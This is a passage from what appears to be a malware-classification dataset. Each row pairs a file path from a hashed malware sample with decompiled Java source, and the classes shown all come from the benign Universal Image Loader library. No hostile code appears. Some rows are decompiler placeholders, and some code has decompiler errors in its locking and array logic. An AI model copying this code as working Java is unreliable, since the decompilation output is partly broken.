ImageDecodingInfo(this.memoryCacheKey,ImageDownloader.Scheme.FILE.wrap(targetFile.getAbsolutePath()),this.uri,targetImageSize,ViewScaleType.FIT_INSIDE,getDownloader(),specialOptions);     Bitmap bmp=this.decoder.decode(decodingInfo);     if (bmp != null && this.configuration.processorForDiskCache != null) {       L.d(LOG_PROCESS_IMAGE_BEFORE_CACHE_ON_DISK,this.memoryCacheKey);       bmp=this.configuration.processorForDiskCache.process(bmp);       if (bmp == null) {         L.e(ERROR_PROCESSOR_FOR_DISK_CACHE_NULL,this.memoryCacheKey);       }     }     if (bmp == null) {       return false;     }     boolean saved=this.configuration.diskCache.save(this.uri,bmp);     bmp.recycle();     return saved;   }   @Override public boolean onBytesCopied(  int current,  int total){     return this.syncLoading || fireProgressEvent(current,total);   }   private boolean fireProgressEvent(  final int current,  final int total){     if (isTaskInterrupted() || isTaskNotActual()) {       return false;     }     if (this.progressListener != null) {       Runnable r=new Runnable(){         @Override public void run(){           LoadAndDisplayImageTask.this.progressListener.onProgressUpdate(LoadAndDisplayImageTask.this.uri,LoadAndDisplayImageTask.this.imageAware.getWrappedView(),current,total);         }       } ;       runTask(r,false,this.handler,this.engine);     }     return true;   }   private void fireFailEvent(  final FailReason.FailType failType,  final Throwable failCause){     if (!this.syncLoading && !isTaskInterrupted() && !isTaskNotActual()) {       Runnable r=new Runnable(){         @Override public void run(){           if (LoadAndDisplayImageTask.this.options.shouldShowImageOnFail()) {             LoadAndDisplayImageTask.this.imageAware.setImageDrawable(LoadAndDisplayImageTask.this.options.getImageOnFail(LoadAndDisplayImageTask.this.configuration.resources));           }           LoadAndDisplayImageTask.this.listener.onLoadingFailed(LoadAndDisplayImageTask.this.uri,LoadAndDisplayImageTask.this.imageAware.getWrappedView(),new FailReason(failType,failCause));         }       } ;       runTask(r,false,this.handler,this.engine);     }   }   private void fireCancelEvent(){     if (!this.syncLoading && !isTaskInterrupted()) {       Runnable r=new Runnable(){         @Override public void run(){           LoadAndDisplayImageTask.this.listener.onLoadingCancelled(LoadAndDisplayImageTask.this.uri,LoadAndDisplayImageTask.this.imageAware.getWrappedView());         }       } ;       runTask(r,false,this.handler,this.engine);     }   }   private ImageDownloader getDownloader(){     if (this.engine.isNetworkDenied()) {       ImageDownloader d=this.networkDeniedDownloader;       return d;     }     if (this.engine.isSlowNetwork()) {       ImageDownloader d2=this.slowNetworkDownloader;       return d2;     }     ImageDownloader d3=this.downloader;     return d3;   }   private void checkTaskNotActual() throws TaskCancelledException {     checkViewCollected();     checkViewReused();   }   private boolean isTaskNotActual(){     return isViewCollected() || isViewReused();   }   private void checkViewCollected() throws TaskCancelledException {     if (isViewCollected()) {       throw new TaskCancelledException();     }   }   private boolean isViewCollected(){     if (!this.imageAware.isCollected()) {       return false;     }     L.d(LOG_TASK_CANCELLED_IMAGEAWARE_COLLECTED,this.memoryCacheKey);     return true;   }   private void checkViewReused() throws TaskCancelledException {     if (isViewReused()) {       throw new TaskCancelledException();     }   }   private boolean isViewReused(){     String currentCacheKey=this.engine.getLoadingUriForView(this.imageAware);     boolean imageAwareWasReused=!this.memoryCacheKey.equals(currentCacheKey);     if (!imageAwareWasReused) {       return false;     }     L.d(LOG_TASK_CANCELLED_IMAGEAWARE_REUSED,this.memoryCacheKey);     return true;   }   private void checkTaskInterrupted() throws TaskCancelledException {     if (isTaskInterrupted()) {       throw new TaskCancelledException();     }   }   private boolean isTaskInterrupted(){     if (!Thread.interrupted()) {       return false;     }     L.d(LOG_TASK_INTERRUPTED,this.memoryCacheKey);     return true;   }   public String getLoadingUri(){     return this.uri;   }   public static void runTask(  Runnable r,  boolean sync,  Handler handler,  ImageLoaderEngine engine){     if (sync) {       r.run();     }  else     if (handler == null) {       engine.fireCallback(r);     }  else {       handler.post(r);     }   } public class TaskCancelledException extends Exception {     TaskCancelledException(){     }   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.nostra13.universalimageloader.core\NetworkDeniedImageDownloader.code","!org.eclipse.jdt.core.dom.TypeDeclaration@7b3f0aae"
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.nostra13.universalimageloader.core\ProcessAndDisplayImageTask.code","public final class ProcessAndDisplayImageTask implements Runnable {   private static final String LOG_POSTPROCESS_IMAGE=""PostProcess image before displaying [%s]"";   private final Bitmap bitmap;   private final ImageLoaderEngine engine;   private final Handler handler;   private final ImageLoadingInfo imageLoadingInfo;   public ProcessAndDisplayImageTask(  ImageLoaderEngine engine,  Bitmap bitmap,  ImageLoadingInfo imageLoadingInfo,  Handler handler){     this.engine=engine;     this.bitmap=bitmap;     this.imageLoadingInfo=imageLoadingInfo;     this.handler=handler;   }   @Override public void run(){     L.d(LOG_POSTPROCESS_IMAGE,this.imageLoadingInfo.memoryCacheKey);     BitmapProcessor processor=this.imageLoadingInfo.options.getPostProcessor();     Bitmap processedBitmap=processor.process(this.bitmap);     DisplayBitmapTask displayBitmapTask=new DisplayBitmapTask(processedBitmap,this.imageLoadingInfo,this.engine,LoadedFrom.MEMORY_CACHE);     LoadAndDisplayImageTask.runTask(displayBitmapTask,this.imageLoadingInfo.options.isSyncLoading(),this.handler,this.engine);   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.nostra13.universalimageloader.core\SlowNetworkImageDownloader.code","!org.eclipse.jdt.core.dom.TypeDeclaration@95446c0"
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.nostra13.universalimageloader.core\SyncImageLoadingListener.code","public static class SyncImageLoadingListener extends SimpleImageLoadingListener {   private Bitmap loadedImage;   private SyncImageLoadingListener(){   }   @Override public void onLoadingComplete(  String imageUri,  View view,  Bitmap loadedImage){     this.loadedImage=loadedImage;   }   public Bitmap getLoadedBitmap(){     return this.loadedImage;   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.nostra13.universalimageloader.core\TaskCancelledException.code","public class TaskCancelledException extends Exception {   TaskCancelledException(){   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.nostra13.universalimageloader.core.assist\AnonymousClass1.code","static class AnonymousClass1 {   static final int[] $SwitchMap$android$widget$ImageView$ScaleType=new int[ImageView.ScaleType.values().length]; static {     try {       $SwitchMap$android$widget$ImageView$ScaleType[ImageView.ScaleType.FIT_CENTER.ordinal()]=1;     }  catch (    NoSuchFieldError e) {     }     try {       $SwitchMap$android$widget$ImageView$ScaleType[ImageView.ScaleType.FIT_XY.ordinal()]=2;     }  catch (    NoSuchFieldError e2) {     }     try {       $SwitchMap$android$widget$ImageView$ScaleType[ImageView.ScaleType.FIT_START.ordinal()]=3;     }  catch (    NoSuchFieldError e3) {     }     try {       $SwitchMap$android$widget$ImageView$ScaleType[ImageView.ScaleType.FIT_END.ordinal()]=4;     }  catch (    NoSuchFieldError e4) {     }     try {       $SwitchMap$android$widget$ImageView$ScaleType[ImageView.ScaleType.CENTER_INSIDE.ordinal()]=5;     }  catch (    NoSuchFieldError e5) {     }     try {       $SwitchMap$android$widget$ImageView$ScaleType[ImageView.ScaleType.MATRIX.ordinal()]=6;     }  catch (    NoSuchFieldError e6) {     }     try {       $SwitchMap$android$widget$ImageView$ScaleType[ImageView.ScaleType.CENTER.ordinal()]=7;     }  catch (    NoSuchFieldError e7) {     }     try {       $SwitchMap$android$widget$ImageView$ScaleType[ImageView.ScaleType.CENTER_CROP.ordinal()]=8;     }  catch (    NoSuchFieldError e8) {     }   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.nostra13.universalimageloader.core.assist\ContentLengthInputStream.code","public class ContentLengthInputStream extends InputStream {   private final int length;   private final InputStream stream;   public ContentLengthInputStream(  InputStream stream,  int length){     this.stream=stream;     this.length=length;   }   @Override public int available(){     return this.length;   }   @Override public void close() throws IOException {     this.stream.close();   }   @Override public void mark(  int readLimit){     this.stream.mark(readLimit);   }   @Override public int read() throws IOException {     return this.stream.read();   }   @Override public int read(  byte[] buffer) throws IOException {     return this.stream.read(buffer);   }   @Override public int read(  byte[] buffer,  int byteOffset,  int byteCount) throws IOException {     return this.stream.read(buffer,byteOffset,byteCount);   }   @Override public void reset() throws IOException {     this.stream.reset();   }   @Override public long skip(  long byteCount) throws IOException {     return this.stream.skip(byteCount);   }   @Override public boolean markSupported(){     return this.stream.markSupported();   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.nostra13.universalimageloader.core.assist\FailReason.code","public class FailReason {   private final Throwable cause;   private final FailType type;   public enum FailType {  IO_ERROR,   DECODING_ERROR,   NETWORK_DENIED,   OUT_OF_MEMORY,   UNKNOWN}   public FailReason(  FailType type,  Throwable cause){     this.type=type;     this.cause=cause;   }   public FailType getType(){     return this.type;   }   public Throwable getCause(){     return this.cause;   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.nostra13.universalimageloader.core.assist\FlushedInputStream.code","public class FlushedInputStream extends FilterInputStream {   public FlushedInputStream(  InputStream inputStream){     super(inputStream);   }   @Override public long skip(  long n) throws IOException {     long totalBytesSkipped=0;     while (totalBytesSkipped < n) {       long bytesSkipped=this.in.skip(n - totalBytesSkipped);       if (bytesSkipped == 0) {         int by_te=read();         if (by_te < 0) {           break;         }         bytesSkipped=1;       }       totalBytesSkipped+=bytesSkipped;     }     return totalBytesSkipped;   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.nostra13.universalimageloader.core.assist\ImageSize.code","public class ImageSize {   private static final String SEPARATOR=""x"";   private static final int TO_STRING_MAX_LENGHT=9;   private final int height;   private final int width;   public ImageSize(  int width,  int height){     this.width=width;     this.height=height;   }   public ImageSize(  int width,  int height,  int rotation){     if (rotation % 180 == 0) {       this.width=width;       this.height=height;     }  else {       this.width=height;       this.height=width;     }   }   public int getWidth(){     return this.width;   }   public int getHeight(){     return this.height;   }   public ImageSize scaleDown(  int sampleSize){     return new ImageSize(this.width / sampleSize,this.height / sampleSize);   }   public ImageSize scale(  float scale){     return new ImageSize((int)(this.width * scale),(int)(this.height * scale));   }   public String toString(){     return new StringBuilder(9).append(this.width).append(SEPARATOR).append(this.height).toString();   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.nostra13.universalimageloader.core.assist.deque\AbstractItr.code","private abstract class AbstractItr implements Iterator<E> {   private Node<E> lastRet;   Node<E> next;   E nextItem;   abstract Node<E> firstNode();   abstract Node<E> nextNode(  Node<E> node);   AbstractItr(){     ReentrantLock lock=LinkedBlockingDeque.this.lock;     lock.lock();     try {       this.next=firstNode();       this.nextItem=this.next == null ? null : this.next.item;     }   finally {       lock.unlock();     }   }   private Node<E> succ(  Node<E> n){     while (true) {       Node<E> s=nextNode(n);       if (s == null) {         return null;       }       if (s.item == null) {         if (s == n) {           return firstNode();         }         n=s;       }  else {         return s;       }     }   }   void advance(){     ReentrantLock lock=LinkedBlockingDeque.this.lock;     lock.lock();     try {       this.next=succ(this.next);       this.nextItem=this.next == null ? null : this.next.item;     }   finally {       lock.unlock();     }   }   @Override public boolean hasNext(){     return this.next != null;   }   @Override public E next(){     if (this.next == null) {       throw new NoSuchElementException();     }     this.lastRet=this.next;     E x=this.nextItem;     advance();     return x;   }   @Override public void remove(){     Node<E> n=this.lastRet;     if (n == null) {       throw new IllegalStateException();     }     this.lastRet=null;     ReentrantLock lock=LinkedBlockingDeque.this.lock;     lock.lock();     try {       if (n.item != null) {         LinkedBlockingDeque.this.unlink(n);       }     }   finally {       lock.unlock();     }   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.nostra13.universalimageloader.core.assist.deque\BlockingDeque.code","public interface BlockingDeque<E> extends BlockingQueue<E>, Deque<E> {   @Override boolean add(  E e);   @Override void addFirst(  E e);   @Override void addLast(  E e);   @Override boolean contains(  Object obj);   @Override E element();   @Override Iterator<E> iterator();   @Override boolean offer(  E e);   @Override boolean offer(  E e,  long j,  TimeUnit timeUnit) throws InterruptedException ;   @Override boolean offerFirst(  E e);   boolean offerFirst(  E e,  long j,  TimeUnit timeUnit) throws InterruptedException ;   @Override boolean offerLast(  E e);   boolean offerLast(  E e,  long j,  TimeUnit timeUnit) throws InterruptedException ;   @Override E peek();   @Override E poll();   @Override E poll(  long j,  TimeUnit timeUnit) throws InterruptedException ;   E pollFirst(  long j,  TimeUnit timeUnit) throws InterruptedException ;   E pollLast(  long j,  TimeUnit timeUnit) throws InterruptedException ;   @Override void push(  E e);   @Override void put(  E e) throws InterruptedException ;   void putFirst(  E e) throws InterruptedException ;   void putLast(  E e) throws InterruptedException ;   @Override E remove();   @Override boolean remove(  Object obj);   @Override boolean removeFirstOccurrence(  Object obj);   @Override boolean removeLastOccurrence(  Object obj);   @Override int size();   @Override E take() throws InterruptedException ;   E takeFirst() throws InterruptedException ;   E takeLast() throws InterruptedException ; } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.nostra13.universalimageloader.core.assist.deque\Deque.code","public interface Deque<E> extends Queue<E> {   boolean add(  E e);   void addFirst(  E e);   void addLast(  E e);   boolean contains(  Object obj);   Iterator<E> descendingIterator();   E element();   E getFirst();   E getLast();   Iterator<E> iterator();   boolean offer(  E e);   boolean offerFirst(  E e);   boolean offerLast(  E e);   E peek();   E peekFirst();   E peekLast();   E poll();   E pollFirst();   E pollLast();   E pop();   void push(  E e);   E remove();   boolean remove(  Object obj);   E removeFirst();   boolean removeFirstOccurrence(  Object obj);   E removeLast();   boolean removeLastOccurrence(  Object obj);   int size(); } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.nostra13.universalimageloader.core.assist.deque\DescendingItr.code","private class DescendingItr extends AbstractItr {   private DescendingItr(){     super();   }   @Override Node<E> firstNode(){     return LinkedBlockingDeque.this.last;   }   @Override Node<E> nextNode(  Node<E> n){     return n.prev;   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.nostra13.universalimageloader.core.assist.deque\Itr.code","private class Itr extends AbstractItr {   private Itr(){     super();   }   @Override Node<E> firstNode(){     return LinkedBlockingDeque.this.first;   }   @Override Node<E> nextNode(  Node<E> n){     return n.next;   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.nostra13.universalimageloader.core.assist.deque\LIFOLinkedBlockingDeque.code","public class LIFOLinkedBlockingDeque<T> extends LinkedBlockingDeque<T> {   private static final long serialVersionUID=-4114786347960826192L;   @Override public boolean offer(  T e){     return super.offerFirst(e);   }   @Override public T remove(){     return (T)super.removeFirst();   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.nostra13.universalimageloader.core.assist.deque\LinkedBlockingDeque.code","public class LinkedBlockingDeque<E> extends AbstractQueue<E> implements BlockingDeque<E>, Serializable {   private static final long serialVersionUID=-387911632671998426L;   private final int capacity;   private transient int count;   transient Node<E> first;   transient Node<E> last;   final ReentrantLock lock;   private final Condition notEmpty;   private final Condition notFull; public static final class Node<E> {     E item;     Node<E> next;     Node<E> prev;     Node(    E x){       this.item=x;     }   }   public LinkedBlockingDeque(){     this(Integer.MAX_VALUE);   }   public LinkedBlockingDeque(  int capacity){     this.lock=new ReentrantLock();     this.notEmpty=this.lock.newCondition();     this.notFull=this.lock.newCondition();     if (capacity <= 0) {       throw new IllegalArgumentException();     }     this.capacity=capacity;   }   public LinkedBlockingDeque(  Collection<? extends E> c){     this(Integer.MAX_VALUE);     ReentrantLock lock=this.lock;     lock.lock();     try {       for (      E e : c) {         if (e == null) {           throw new NullPointerException();         }         if (!linkLast(new Node<>(e))) {           throw new IllegalStateException(""Deque full"");         }       }     }   finally {       lock.unlock();     }   }   private boolean linkFirst(  Node<E> node){     if (this.count >= this.capacity) {       return false;     }     Node<E> f=this.first;     node.next=f;     this.first=node;     if (this.last == null) {       this.last=node;     }  else {       f.prev=node;     }     this.count++;     this.notEmpty.signal();     return true;   }   private boolean linkLast(  Node<E> node){     if (this.count >= this.capacity) {       return false;     }     Node<E> l=this.last;     node.prev=l;     this.last=node;     if (this.first == null) {       this.first=node;     }  else {       l.next=node;     }     this.count++;     this.notEmpty.signal();     return true;   }   private E unlinkFirst(){     Node<E> f=this.first;     if (f == null) {       return null;     }     Node<E> n=f.next;     E e=f.item;     f.item=null;     f.next=f;     this.first=n;     if (n == null) {       this.last=null;     }  else {       n.prev=null;     }     this.count--;     this.notFull.signal();     return e;   }   private E unlinkLast(){     Node<E> l=this.last;     if (l == null) {       return null;     }     Node<E> p=l.prev;     E e=l.item;     l.item=null;     l.prev=l;     this.last=p;     if (p == null) {       this.first=null;     }  else {       p.next=null;     }     this.count--;     this.notFull.signal();     return e;   }   void unlink(  Node<E> x){     Node<E> p=x.prev;     Node<E> n=x.next;     if (p == null) {       unlinkFirst();       return;     }     if (n == null) {       unlinkLast();       return;     }     p.next=n;     n.prev=p;     x.item=null;     this.count--;     this.notFull.signal();   }   @Override public void addFirst(  E e){     if (!offerFirst(e)) {       throw new IllegalStateException(""Deque full"");     }   }   @Override public void addLast(  E e){     if (!offerLast(e)) {       throw new IllegalStateException(""Deque full"");     }   }   @Override public boolean offerFirst(  E e){     if (e == null) {       throw new NullPointerException();     }     Node<E> node=new Node<>(e);     ReentrantLock lock=this.lock;     lock.lock();     try {       return linkFirst(node);     }   finally {       lock.unlock();     }   }   @Override public boolean offerLast(  E e){     if (e == null) {       throw new NullPointerException();     }     Node<E> node=new Node<>(e);     ReentrantLock lock=this.lock;     lock.lock();     try {       return linkLast(node);     }   finally {       lock.unlock();     }   }   @Override public void putFirst(  E e) throws InterruptedException {     if (e == null) {       throw new NullPointerException();     }     Node<E> node=new Node<>(e);     ReentrantLock lock=this.lock;     lock.lock();     while (!linkFirst(node)) {       try {         this.notFull.await();       }   finally {         lock.unlock();       }     }   }   @Override public void putLast(  E e) throws InterruptedException {     if (e == null) {       throw new NullPointerException();     }     Node<E> node=new Node<>(e);     ReentrantLock lock=this.lock;     lock.lock();     while (!linkLast(node)) {       try {         this.notFull.await();       }   finally {         lock.unlock();       }     }   }   @Override public boolean offerFirst(  E e,  long timeout,  TimeUnit unit) throws InterruptedException {     if (e == null) {       throw new NullPointerException();     }     Node<E> node=new Node<>(e);     long nanos=unit.toNanos(timeout);     ReentrantLock lock=this.lock;     lock.lockInterruptibly();     while (!linkFirst(node)) {       try {         if (nanos > 0) {           nanos=this.notFull.awaitNanos(nanos);         }  else {           return false;         }       }   finally {         lock.unlock();       }     }     return true;   }   @Override public boolean offerLast(  E e,  long timeout,  TimeUnit unit) throws InterruptedException {     if (e == null) {       throw new NullPointerException();     }     Node<E> node=new Node<>(e);     long nanos=unit.toNanos(timeout);     ReentrantLock lock=this.lock;     lock.lockInterruptibly();     while (!linkLast(node)) {       try {         if (nanos > 0) {           nanos=this.notFull.awaitNanos(nanos);         }  else {           return false;         }       }   finally {         lock.unlock();       }     }     return true;   }   @Override public E removeFirst(){     E x=pollFirst();     if (x == null) {       throw new NoSuchElementException();     }     return x;   }   @Override public E removeLast(){     E x=pollLast();     if (x == null) {       throw new NoSuchElementException();     }     return x;   }   @Override public E pollFirst(){     ReentrantLock lock=this.lock;     lock.lock();     try {       return unlinkFirst();     }   finally {       lock.unlock();     }   }   @Override public E pollLast(){     ReentrantLock lock=this.lock;     lock.lock();     try {       return unlinkLast();     }   finally {       lock.unlock();     }   }   @Override public E takeFirst() throws InterruptedException {     ReentrantLock lock=this.lock;     lock.lock();     while (true) {       try {         E x=unlinkFirst();         if (x != null) {           return x;         }         this.notEmpty.await();       }   finally {         lock.unlock();       }     }   }   @Override public E takeLast() throws InterruptedException {     ReentrantLock lock=this.lock;     lock.lock();     while (true) {       try {         E x=unlinkLast();         if (x != null) {           return x;         }         this.notEmpty.await();       }   finally {         lock.unlock();       }     }   }   @Override public E pollFirst(  long timeout,  TimeUnit unit) throws InterruptedException {     long nanos=unit.toNanos(timeout);     ReentrantLock lock=this.lock;     lock.lockInterruptibly();     while (true) {       try {         E x=unlinkFirst();         if (x != null) {           return x;         }         if (nanos > 0) {           nanos=this.notEmpty.awaitNanos(nanos);         }  else {           return null;         }       }   finally {         lock.unlock();       }     }   }   @Override public E pollLast(  long timeout,  TimeUnit unit) throws InterruptedException {     long nanos=unit.toNanos(timeout);     ReentrantLock lock=this.lock;     lock.lockInterruptibly();     while (true) {       try {         E x=unlinkLast();         if (x != null) {           return x;         }         if (nanos > 0) {           nanos=this.notEmpty.awaitNanos(nanos);         }  else {           return null;         }       }   finally {         lock.unlock();       }     }   }   @Override public E getFirst(){     E x=peekFirst();     if (x == null) {       throw new NoSuchElementException();     }     return x;   }   @Override public E getLast(){     E x=peekLast();     if (x == null) {       throw new NoSuchElementException();     }     return x;   }   @Override public E peekFirst(){     ReentrantLock lock=this.lock;     lock.lock();     try {       return this.first == null ? null : this.first.item;     }   finally {       lock.unlock();     }   }   @Override public E peekLast(){     ReentrantLock lock=this.lock;     lock.lock();     try {       return this.last == null ? null : this.last.item;     }   finally {       lock.unlock();     }   }   @Override public boolean removeFirstOccurrence(  Object o){     if (o == null) {       return false;     }     ReentrantLock lock=this.lock;     lock.lock();     try {       for (Node<E> p=this.first; p != null; p=p.next) {         if (o.equals(p.item)) {           unlink(p);           return true;         }       }       return false;     }   finally {       lock.unlock();     }   }   @Override public boolean removeLastOccurrence(  Object o){     if (o == null) {       return false;     }     ReentrantLock lock=this.lock;     lock.lock();     try {       for (Node<E> p=this.last; p != null; p=p.prev) {         if (o.equals(p.item)) {           unlink(p);           return true;         }       }       return false;     }   finally {       lock.unlock();     }   }   @Override public boolean add(  E e){     addLast(e);     return true;   }   public boolean offer(  E e){     return offerLast(e);   }   @Override public void put(  E e) throws InterruptedException {     putLast(e);   }   @Override public boolean offer(  E e,  long timeout,  TimeUnit unit) throws InterruptedException {     return offerLast(e,timeout,unit);   }   @Override public E remove(){     return removeFirst();   }   @Override public E poll(){     return pollFirst();   }   @Override public E take() throws InterruptedException {     return takeFirst();   }   @Override public E poll(  long timeout,  TimeUnit unit) throws InterruptedException {     return pollFirst(timeout,unit);   }   @Override public E element(){     return getFirst();   }   @Override public E peek(){     return peekFirst();   }   @Override public int remainingCapacity(){     ReentrantLock lock=this.lock;     lock.lock();     try {       return this.capacity - this.count;     }   finally {       lock.unlock();     }   }   @Override public int drainTo(  Collection<? super E> c){     return drainTo(c,Integer.MAX_VALUE);   }   @Override public int drainTo(  Collection<? super E> collection,  int i){     if (collection == null) {       throw new NullPointerException();     }     if (collection == this) {       throw new IllegalArgumentException();     }     ReentrantLock reentrantLock=this.lock;     reentrantLock.lock();     try {       int min=Math.min(i,this.count);       for (int i2=0; i2 < min; i2++) {         collection.add(this.first.item);         unlinkFirst();       }       return min;     }   finally {       reentrantLock.unlock();     }   }   @Override public void push(  E e){     addFirst(e);   }   @Override public E pop(){     return removeFirst();   }   @Override public boolean remove(  Object o){     return removeFirstOccurrence(o);   }   @Override public int size(){     ReentrantLock lock=this.lock;     lock.lock();     try {       return this.count;     }   finally {       lock.unlock();     }   }   @Override public boolean contains(  Object o){     if (o == null) {       return false;     }     ReentrantLock lock=this.lock;     lock.lock();     try {       for (Node<E> p=this.first; p != null; p=p.next) {         if (o.equals(p.item)) {           return true;         }       }       return false;     }   finally {       lock.unlock();     }   }   @Override public Object[] toArray(){     ReentrantLock lock=this.lock;     lock.lock();     try {       Object[] a=new Object[this.count];       Node<E> p=this.first;       int k=0;       while (p != null) {         int k2=k + 1;         a[k]=p.item;         p=p.next;         k=k2;       }       return a;     }   finally {       lock.unlock();     }   }   @Override public <T>T[] toArray(  T[] tArr){     ReentrantLock reentrantLock=this.lock;     reentrantLock.lock();     try {       if (tArr.length < this.count) {         tArr=(Object[])Array.newInstance(tArr.getClass().getComponentType(),this.count);       }       Node<E> node=this.first;       int i=0;       while (node != null) {         tArr[i]=node.item;         node=node.next;         i++;       }       if (tArr.length > i) {         tArr[i]=0;       }       return tArr;     }   finally {       reentrantLock.unlock();     }   }   @Override public String toString(){     String sb;     ReentrantLock lock=this.lock;     lock.lock();     try {       Node<E> p=this.first;       if (p == null) {         sb=""[]"";       }  else {         StringBuilder sb2=new StringBuilder();         sb2.append('[');         while (true) {           Object obj=p.item;           if (obj == this) {             obj=""(this Collection)"";           }           sb2.append(obj);           p=p.next;           if (p == null) {             break;           }           sb2.append(',').append(' ');         }         sb=sb2.append(']').toString();       }       return sb;     }   finally {       lock.unlock();     }   }   @Override public void clear(){     ReentrantLock lock=this.lock;     lock.lock();     try {       Node<E> f=this.first;       while (f != null) {         f.item=null;         Node<E> n=f.next;         f.prev=null;         f.next=null;         f=n;       }       this.last=null;       this.first=null;       this.count=0;       this.notFull.signalAll();     }   finally {       lock.unlock();     }   }   @Override public Iterator<E> iterator(){     return new Itr();   }   @Override public Iterator<E> descendingIterator(){     return new DescendingItr();   } private abstract class AbstractItr implements Iterator<E> {     private Node<E> lastRet;     Node<E> next;     E nextItem;     abstract Node<E> firstNode();     abstract Node<E> nextNode(    Node<E> node);     AbstractItr(){       ReentrantLock lock=LinkedBlockingDeque.this.lock;       lock.lock();       try {         this.next=firstNode();         this.nextItem=this.next == null ? null : this.next.item;       }   finally {         lock.unlock();       }     }     private Node<E> succ(    Node<E> n){       while (true) {         Node<E> s=nextNode(n);         if (s == null) {           return null;         }         if (s.item == null) {           if (s == n) {             return firstNode();           }           n=s;         }  else {           return s;         }       }     }     void advance(){       ReentrantLock lock=LinkedBlockingDeque.this.lock;       lock.lock();       try {         this.next=succ(this.next);         this.nextItem=this.next == null ? null : this.next.item;       }   finally {         lock.unlock();       }     }     @Override public boolean hasNext(){       return this.next != null;     }     @Override public E next(){       if (this.next == null) {         throw new NoSuchElementException();       }       this.lastRet=this.next;       E x=this.nextItem;       advance();       return x;     }     @Override public void remove(){       Node<E> n=this.lastRet;       if (n == null) {         throw new IllegalStateException();       }       this.lastRet=null;       ReentrantLock lock=LinkedBlockingDeque.this.lock;       lock.lock();       try {         if (n.item != null) {           LinkedBlockingDeque.this.unlink(n);         }       }   finally {         lock.unlock();       }     }   } private class Itr extends AbstractItr {     private Itr(){       super();     }     @Override Node<E> firstNode(){       return LinkedBlockingDeque.this.first;     }     @Override Node<E> nextNode(    Node<E> n){       return n.next;     }   } private class DescendingItr extends AbstractItr {     private DescendingItr(){       super();     }     @Override Node<E> firstNode(){       return LinkedBlockingDeque.this.last;     }     @Override Node<E> nextNode(    Node<E> n){       return n.prev;     }   }   private void writeObject(  ObjectOutputStream s) throws IOException {     ReentrantLock lock=this.lock;     lock.lock();     try {       s.defaultWriteObject();       for (Node<E> p=this.first; p != null; p=p.next) {         s.writeObject(p.item);       }       s.writeObject(null);     }   finally {       lock.unlock();     }   }   private void readObject(  ObjectInputStream s) throws IOException, ClassNotFoundException {     s.defaultReadObject();     this.count=0;     this.first=null;     this.last=null;     while (true) {       Object readObject=s.readObject();       if (readObject != null) {         add(readObject);       }  else {         return;       }     }   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.nostra13.universalimageloader.core.assist.deque\Node.code","public static final class Node<E> {   E item;   Node<E> next;   Node<E> prev;   Node(  E x){     this.item=x;   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.nostra13.universalimageloader.core.decode\BaseImageDecoder.code","public class BaseImageDecoder implements ImageDecoder {   protected static final String ERROR_CANT_DECODE_IMAGE=""Image can't be decoded [%s]"";   protected static final String LOG_FLIP_IMAGE=""Flip image horizontally [%s]"";   protected static final String LOG_ROTATE_IMAGE=""Rotate image on %1$dÂ° [%2$s]"";   protected static final String LOG_SCALE_IMAGE=""Scale subsampled image (%1$s) to %2$s (scale = %3$.5f) [%4$s]"";   protected static final String LOG_SUBSAMPLE_IMAGE=""Subsample original image (%1$s) to %2$s (scale = %3$d) [%4$s]"";   protected final boolean loggingEnabled;   public BaseImageDecoder(  boolean loggingEnabled){     this.loggingEnabled=loggingEnabled;   }   @Override public Bitmap decode(  ImageDecodingInfo decodingInfo) throws IOException {     InputStream imageStream=getImageStream(decodingInfo);     try {       ImageFileInfo imageInfo=defineImageSizeAndRotation(imageStream,decodingInfo);       imageStream=resetStream(imageStream,decodingInfo);       BitmapFactory.Options decodingOptions=prepareDecodingOptions(imageInfo.imageSize,decodingInfo);       Bitmap decodedBitmap=BitmapFactory.decodeStream(imageStream,null,decodingOptions);       if (decodedBitmap == null) {         L.e(ERROR_CANT_DECODE_IMAGE,decodingInfo.getImageKey());         return decodedBitmap;       }       return considerExactScaleAndOrientatiton(decodedBitmap,decodingInfo,imageInfo.exif.rotation,imageInfo.exif.flipHorizontal);     }   finally {       IoUtils.closeSilently(imageStream);     }   }   protected InputStream getImageStream(  ImageDecodingInfo 